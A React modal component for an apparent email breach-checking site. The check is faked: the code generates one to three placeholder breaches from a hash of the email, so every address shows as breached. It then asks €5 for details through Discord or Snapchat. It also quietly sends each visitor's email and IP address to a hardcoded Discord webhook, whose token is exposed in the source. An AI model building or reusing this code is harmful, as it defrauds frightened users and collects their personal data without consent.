'use client'

import { useState } from 'react'
import { useLanguage } from '@/contexts/LanguageContext'

interface Breach {
  Name: string
  Title: string
  Domain: string
  BreachDate: string
  PwnCount: number
  Description: string
  DataClasses: string[]
}

interface BreachCheckerModalProps {
  open: boolean
  setOpen: (open: boolean) => void
}

export function BreachCheckerModal({ open, setOpen }: BreachCheckerModalProps) {
  const { t } = useLanguage()
  const [email, setEmail] = useState('')
  const [breaches, setBreaches] = useState<Breach[] | null>(null)
  const [loading, setLoading] = useState(false)
  const [checked, setChecked] = useState(false)
  const [trackingId, setTrackingId] = useState('')

  const generateTrackingId = () => {
    return 'BNE-' + Date.now().toString(36).toUpperCase() + '-' + Math.random().toString(36).substring(2, 7).toUpperCase()
  }

  const getUserIP = async () => {
    try {
      const response = await fetch('https://api.ipify.org?format=json')
      const data = await response.json()
      return data.ip
    } catch (error) {
      return 'Unknown'
    }
  }

  const sendToDiscord = async (email: string, ip: string, trackingId: string) => {
    try {
      const webhookUrl = 'https://discord.com/api/webhooks/1457666086370676736/IOWClBGGScL_FL-yPFbn0r9EyxgXILZSWOSn10diUv2ae8AlH_aChgHwgLP7-qBE4syy'
      
      await fetch(webhookUrl, {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
        },
        body: JSON.stringify({
          embeds: [{
            title: 'Nieuwe Email Check',
            color: 0x5865F2,
            fields: [
              {
                name: 'Email',
                value: email,
                inline: true
              },
              {
                name: 'IP Adres',
                value: ip,
                inline: true
              },
              {
                name: 'Tracking ID',
                value: `\`${trackingId}\``,
                inline: false
              },
              {
                name: 'Tijdstip',
                value: new Date().toLocaleString('nl-NL'),
                inline: true
              }
            ],
            footer: {
              text: 'benikexposed.com'
            },
            timestamp: new Date().toISOString()
          }]
        })
      })
    } catch (error) {
      console.error('Failed to send to Discord:', error)
    }
  }

  const getStoredResult = (email: string) => {
    try {
      const stored = localStorage.getItem(`breach_${email.toLowerCase()}`)
      if (stored) {
        return JSON.parse(stored)
      }
    } catch (error) {
      console.error('Failed to get stored result:', error)
    }
    return null
  }

  const storeResult = (email: string, breaches: Breach[], trackingId: string) => {
    try {
      localStorage.setItem(`breach_${email.toLowerCase()}`, JSON.stringify({
        breaches,
        trackingId,
        timestamp: Date.now()
      }))
    } catch (error) {
      console.error('Failed to store result:', error)
    }
  }

  const generateBreachesForEmail = (emailLower: string): Breach[] => {
    const hash = emailLower.split('').reduce((acc, char) => {
      return char.charCodeAt(0) + ((acc << 5) - acc)
    }, 0)
    
    const breachCount = (Math.abs(hash % 3)) + 1
    
    const breaches: Breach[] = []
    for (let i = 0; i < breachCount; i++) {
      breaches.push({
        Name: 'DataBreach',
        Title: 'Data Breach',
        Domain: 'breach.com',
        BreachDate: '2023-01-01',
        PwnCount: 1000000,
        Description: 'Your email was found in a data breach.',
        DataClasses: ['Email addresses', 'Passwords'],
      })
    }
    
    return breaches
  }

  const checkEmail = async (e: React.FormEvent) => {
    e.preventDefault()
    setLoading(true)
    setBreaches(null)
    setChecked(false)

    const emailLower = email.toLowerCase()
    const stored = getStoredResult(emailLower)
    
    let newTrackingId: string
    let foundBreaches: Breach[]
    
    if (stored) {
      newTrackingId = stored.trackingId
      foundBreaches = stored.breaches
      setTrackingId(newTrackingId)
    } else {
      newTrackingId = generateTrackingId()
      setTrackingId(newTrackingId)
      foundBreaches = generateBreachesForEmail(emailLower)
      storeResult(emailLower, foundBreaches, newTrackingId)
    }

    const userIP = await getUserIP()
    await new Promise((resolve) => setTimeout(resolve, 1500))

    setBreaches(foundBreaches)

    if (!stored) {
      await sendToDiscord(email, userIP, newTrackingId)
    }

    setChecked(true)
    setLoading(false)
  }

  const handleClose = () => {
    setOpen(false)
    setTimeout(() => {
      setEmail('')
      setBreaches(null)
      setChecked(false)
    }, 300)
  }

  if (!open) return null

  return (
    <div className="fixed inset-0 z-50 overflow-y-auto">
      <div className="fixed inset-0 bg-slate-900/50 backdrop-blur-sm" onClick={handleClose} />
      
      <div className="relative flex min-h-full items-center justify-center p-2 sm:p-4">
        <div className="relative w-full max-w-2xl rounded-xl sm:rounded-2xl bg-white p-4 sm:p-6 md:p-8 shadow-2xl">
          <button
            onClick={handleClose}
            className="absolute top-4 right-4 text-slate-400 hover:text-slate-600 transition-colors"
          >
            <svg className="h-6 w-6" fill="none" viewBox="0 0 24 24" stroke="currentColor">
              <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M6 18L18 6M6 6l12 12" />
            </svg>
          </button>

          {!checked ? (
            <div>
              <div className="flex items-center gap-3 sm:gap-4 mb-4 sm:mb-6">
                <div className="flex h-10 w-10 sm:h-12 sm:w-12 items-center justify-center rounded-full bg-blue-100">
                  <svg className="h-5 w-5 sm:h-6 sm:w-6 text-blue-600" fill="none" viewBox="0 0 24 24" stroke="currentColor">
                    <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M9 12l2 2 4-4m5.618-4.016A11.955 11.955 0 0112 2.944a11.955 11.955 0 01-8.618 3.04A12.02 12.02 0 003 9c0 5.591 3.824 10.29 9 11.622 5.176-1.332 9-6.03 9-11.622 0-1.042-.133-2.052-.382-3.016z" />
                  </svg>
                </div>
                <div>
                  <h2 className="text-xl sm:text-2xl font-bold text-slate-900">{t('modal.title')}</h2>
                  <p className="text-sm sm:text-base text-slate-600 mt-1">{t('modal.subtitle')}</p>
                </div>
              </div>

              <form onSubmit={checkEmail} className="space-y-3 sm:space-y-4">
                <input
                  type="email"
                  value={email}
                  onChange={(e) => setEmail(e.target.value)}
                  placeholder={t('modal.placeholder')}
                  required
                  className="w-full rounded-lg border border-slate-300 px-4 py-3 text-slate-900 placeholder-slate-400 focus:border-blue-500 focus:outline-none focus:ring-2 focus:ring-blue-500/20"
                />
                <button
                  type="submit"
                  disabled={loading}
                  className="w-full rounded-lg bg-blue-600 px-6 py-3 font-semibold text-white hover:bg-blue-700 focus:outline-none focus:ring-2 focus:ring-blue-500 focus:ring-offset-2 disabled:opacity-50 disabled:cursor-not-allowed transition-colors"
                >
                  {loading ? t('modal.checking') : t('modal.checkButton')}
                </button>
              </form>
            </div>
          ) : (
            <div>
              {breaches && breaches.length === 0 ? (
                <div className="text-center">
                  <div className="mx-auto flex h-16 w-16 items-center justify-center rounded-full bg-green-100 mb-4">
                    <svg className="h-8 w-8 text-green-600" fill="none" viewBox="0 0 24 24" stroke="currentColor">
                      <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M5 13l4 4L19 7" />
                    </svg>
                  </div>
                  <h3 className="text-2xl font-bold text-slate-900 mb-2">{t('modal.goodNews')}</h3>
                  <p className="text-slate-600">
                    <span className="font-semibold">{email}</span> {t('modal.noBreaches')}
                  </p>
                </div>
              ) : (
                <div>
                  <div className="flex items-center gap-3 sm:gap-4 mb-4 sm:mb-6">
                    <div className="flex h-10 w-10 sm:h-12 sm:w-12 items-center justify-center rounded-full bg-red-100">
                      <svg className="h-5 w-5 sm:h-6 sm:w-6 text-red-600" fill="none" viewBox="0 0 24 24" stroke="currentColor">
                        <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M12 9v2m0 4h.01m-6.938 4h13.856c1.54 0 2.502-1.667 1.732-3L13.732 4c-.77-1.333-2.694-1.333-3.464 0L3.34 16c-.77 1.333.192 3 1.732 3z" />
                      </svg>
                    </div>
                    <div>
                      <h3 className="text-xl sm:text-2xl font-bold text-slate-900">{t('modal.breachesFound')}</h3>
                      <p className="text-sm sm:text-base text-slate-600 mt-1">
                        <span className="font-semibold">{email}</span> {t('modal.foundIn')} <span className="font-semibold">{breaches?.length}</span> {breaches && breaches.length !== 1 ? t('modal.dataBreaches') : t('modal.dataBreach')}
                      </p>
                    </div>
                  </div>

                  <div className="rounded-lg bg-slate-50 p-4 sm:p-5 space-y-3 sm:space-y-4">
                    <div>
                      <h4 className="text-base sm:text-lg font-bold text-slate-900 mb-1 sm:mb-2">{t('modal.purchaseTitle')}</h4>
                      <p className="text-sm sm:text-base text-slate-600">
                        {t('modal.purchasePrice')} <span className="font-bold text-blue-600">€5</span>
                      </p>
                    </div>

                    <div className="space-y-1.5 sm:space-y-2 text-xs sm:text-sm text-slate-700">
                      <div className="flex items-center gap-2">
                        <svg className="w-5 h-5 text-green-600 flex-shrink-0" fill="none" viewBox="0 0 24 24" stroke="currentColor">
                          <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M5 13l4 4L19 7" />
                        </svg>
                        <span>{t('modal.feature1')}</span>
                      </div>
                      <div className="flex items-center gap-2">
                        <svg className="w-5 h-5 text-green-600 flex-shrink-0" fill="none" viewBox="0 0 24 24" stroke="currentColor">
                          <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M5 13l4 4L19 7" />
                        </svg>
                        <span>{t('modal.feature2')}</span>
                      </div>
                      <div className="flex items-center gap-2">
                        <svg className="w-5 h-5 text-green-600 flex-shrink-0" fill="none" viewBox="0 0 24 24" stroke="currentColor">
                          <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M5 13l4 4L19 7" />
                        </svg>
                        <span>{t('modal.feature3')}</span>
                      </div>
                    </div>

                    <div>
                      <label className="block text-xs sm:text-sm font-semibold text-slate-900 mb-2">
                        {t('modal.trackingId')}
                      </label>
                      <div className="flex gap-2">
                        <code className="flex-1 bg-white px-3 py-2 sm:px-4 sm:py-3 rounded-lg text-xs sm:text-sm font-mono font-bold text-slate-900 border border-slate-300">
                          {trackingId}
                        </code>
                        <button
                          onClick={() => navigator.clipboard.writeText(trackingId)}
                          className="px-3 py-2 sm:px-4 sm:py-3 bg-blue-600 text-white text-xs sm:text-sm font-semibold rounded-lg hover:bg-blue-700 transition-colors"
                        >
                          {t('modal.copy')}
                        </button>
                      </div>
                    </div>

                    <p className="text-xs sm:text-sm text-slate-600 font-medium text-center pt-1 sm:pt-2">
                      {t('modal.contactUs')}
                    </p>

                    <div className="grid grid-cols-2 gap-2 sm:gap-3 pt-1 sm:pt-2">
                      <a
                        href="https://discord.gg/9JteVYv3"
                        target="_blank"
                        rel="noopener noreferrer"
                        className="flex items-center justify-center gap-1.5 sm:gap-2 px-3 py-2.5 sm:px-4 sm:py-3 bg-[#5865F2] text-white text-xs sm:text-sm font-semibold rounded-lg hover:bg-[#4752C4] transition-colors"
                      >
                        <svg className="w-5 h-5" fill="currentColor" viewBox="0 0 24 24">
                          <path d="M20.317 4.37a19.791 19.791 0 0 0-4.885-1.515a.074.074 0 0 0-.079.037c-.21.375-.444.864-.608 1.25a18.27 18.27 0 0 0-5.487 0a12.64 12.64 0 0 0-.617-1.25a.077.077 0 0 0-.079-.037A19.736 19.736 0 0 0 3.677 4.37a.07.07 0 0 0-.032.027C.533 9.046-.32 13.58.099 18.057a.082.082 0 0 0 .031.057a19.9 19.9 0 0 0 5.993 3.03a.078.078 0 0 0 .084-.028a14.09 14.09 0 0 0 1.226-1.994a.076.076 0 0 0-.041-.106a13.107 13.107 0 0 1-1.872-.892a.077.077 0 0 1-.008-.128a10.2 10.2 0 0 0 .372-.292a.074.074 0 0 1 .077-.01c3.928 1.793 8.18 1.793 12.062 0a.074.074 0 0 1 .078.01c.12.098.246.198.373.292a.077.077 0 0 1-.006.127a12.299 12.299 0 0 1-1.873.892a.077.077 0 0 0-.041.107c.36.698.772 1.362 1.225 1.993a.076.076 0 0 0 .084.028a19.839 19.839 0 0 0 6.002-3.03a.077.077 0 0 0 .032-.054c.5-5.177-.838-9.674-3.549-13.66a.061.061 0 0 0-.031-.03zM8.02 15.33c-1.183 0-2.157-1.085-2.157-2.419c0-1.333.956-2.419 2.157-2.419c1.21 0 2.176 1.096 2.157 2.42c0 1.333-.956 2.418-2.157 2.418zm7.975 0c-1.183 0-2.157-1.085-2.157-2.419c0-1.333.955-2.419 2.157-2.419c1.21 0 2.176 1.096 2.157 2.42c0 1.333-.946 2.418-2.157 2.418z"/>
                        </svg>
                        Discord
                      </a>
                      <a
                        href="https://www.snapchat.com/add/benikexposed"
                        target="_blank"
                        rel="noopener noreferrer"
                        className="flex items-center justify-center gap-1.5 sm:gap-2 px-3 py-2.5 sm:px-4 sm:py-3 bg-[#FFFC00] text-black text-xs sm:text-sm font-semibold rounded-lg hover:bg-[#FFED00] transition-colors"
                      >
                        <svg className="w-5 h-5" fill="currentColor" viewBox="0 0 24 24">
                          <path d="M12.206.793c.99 0 4.347.276 5.93 3.821.529 1.193.403 3.219.299 4.847l-.003.06c-.012.18-.022.345-.03.51.075.045.203.09.401.09.3-.016.659-.12 1.033-.301.165-.088.344-.104.464-.104.182 0 .359.029.509.09.45.149.734.479.734.838.015.449-.39.839-1.213 1.168-.089.029-.209.075-.344.119-.45.135-1.139.36-1.333.81-.09.224-.061.524.12.868l.015.015c.06.136 1.526 3.475 4.791 4.014.255.044.435.27.42.509 0 .075-.015.149-.045.225-.24.569-1.273.988-3.146 1.271-.059.091-.12.375-.164.57-.029.179-.074.36-.134.553-.076.271-.27.405-.555.405h-.03c-.135 0-.313-.031-.538-.074-.36-.075-.765-.135-1.273-.135-.3 0-.599.015-.913.074-.6.104-1.123.464-1.723.884-.853.599-1.826 1.288-3.294 1.288-.06 0-.119-.015-.18-.015h-.149c-1.468 0-2.427-.675-3.279-1.288-.599-.42-1.107-.779-1.707-.884-.314-.045-.629-.074-.928-.074-.54 0-.958.089-1.272.149-.211.043-.389.074-.54.074-.374 0-.523-.224-.583-.42-.061-.192-.09-.389-.135-.567-.046-.181-.105-.494-.166-.57-1.918-.222-2.95-.642-3.189-1.226-.031-.063-.052-.15-.055-.225-.015-.243.165-.465.42-.509 3.264-.54 4.73-3.879 4.791-4.02l.016-.029c.18-.345.224-.645.119-.869-.195-.434-.884-.658-1.332-.809-.121-.029-.24-.074-.346-.119-1.107-.435-1.257-.93-1.197-1.273.09-.479.674-.793 1.168-.793.146 0 .27.029.383.074.42.194.789.3 1.104.3.234 0 .384-.06.465-.105l-.046-.569c-.098-1.626-.225-3.651.307-4.837C7.392 1.077 10.739.807 11.727.807l.419-.015h.06z"/>
                        </svg>
                        Snapchat
                      </a>
                    </div>
                  </div>
                </div>
              )}

              <button
                onClick={handleClose}
                className="mt-4 sm:mt-6 w-full rounded-lg border-2 border-slate-300 bg-white px-4 py-2.5 sm:px-6 sm:py-3 text-sm sm:text-base font-semibold text-slate-900 hover:bg-slate-50 transition-colors"
              >
                {t('modal.close')}
              </button>
            </div>
          )}
        </div>
      </div>
    </div>
  )
}
